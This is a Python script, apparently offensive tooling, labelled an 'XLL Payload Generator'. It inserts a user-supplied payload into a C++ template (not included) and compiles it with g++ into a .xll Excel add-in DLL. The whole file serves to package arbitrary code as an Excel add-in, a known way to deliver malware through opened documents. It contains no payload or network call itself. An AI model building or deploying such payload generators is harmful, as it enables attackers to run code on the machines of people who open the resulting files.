import argparse
import subprocess

cmdParser = argparse.ArgumentParser(description="XLL Payload Generator\n - Wadzoothezombot")
cmdParser.add_argument("-p",metavar="Payload",type=str,help="Payload for XLL script('' required)",required=True)
cmdParser.add_argument("-fn",metavar="Filename",type=str,help="File name for XLL dll payload(!FileExt Not Required)",required=True)
args = cmdParser.parse_args()

p = args.p
fn = args.fn


def fncmain(p,fn):
    try:
        print("[+] Arguments Provided: Starting Script")
        template = open("src.cpp","r").read()
        template = template.format(p)
        try:
            with open(f"bin/~temp.cpp","w") as temp:
                temp.write(template)
            print("[+] Payload Written to bin/~temp.cpp")
            
        except Exception as f:
            print("[-] An error occured while making the Tempfile\n {}".format(f))
        
        ok = subprocess.run(["g++",
                             "-shared",
                             "-o",
                             "bin\\{}.xll".format(fn),
                             "bin\\~temp.cpp"],
                            shell=True,
                            stderr=subprocess.PIPE)
        if ok.stderr != b"":
            print("[-] There was an error while compiling\n {}".format(ok.stderr))
        else:
            print("[++] {}.xll was successfully compiled to /bin/{}.xll".format(fn,fn))
        
    except Exception as e:
        print("[-] There was an Exception\n {}".format(e))
        
    
if __name__ == "__main__":
    if '.xll' in fn:
        cmdParser.print_help()
        exit(1)
    else:
        fncmain(p,fn)
    

